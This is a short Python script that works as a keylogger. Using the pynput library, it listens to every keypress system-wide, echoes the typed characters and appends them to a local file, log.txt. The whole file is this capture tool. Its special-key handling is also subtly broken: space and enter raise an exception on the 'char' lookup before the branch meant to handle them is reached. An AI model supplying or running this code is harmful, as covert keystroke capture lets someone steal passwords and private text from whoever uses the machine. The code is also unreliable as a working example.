from pynput import keyboard

def key_pressed(key):
    try:
        # Check if the key has a char attribute
        typed = key.char
        if typed is None:
            # Handle special keys (non-character keys)
            if key == keyboard.Key.space:
                typed = ' '  # Represent space explicitly
            elif key == keyboard.Key.enter:
                typed = '\n'  # Represent newline explicitly
            else:
                typed = ''  # Ignore other special keys (you can choose to handle them if needed)
        
        print(typed, end='')  # Print without adding a newline
        with open("log.txt", "a") as logfile:
            logfile.write(typed)
    
    except Exception as e:
        print(f"Error occurred: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()




    


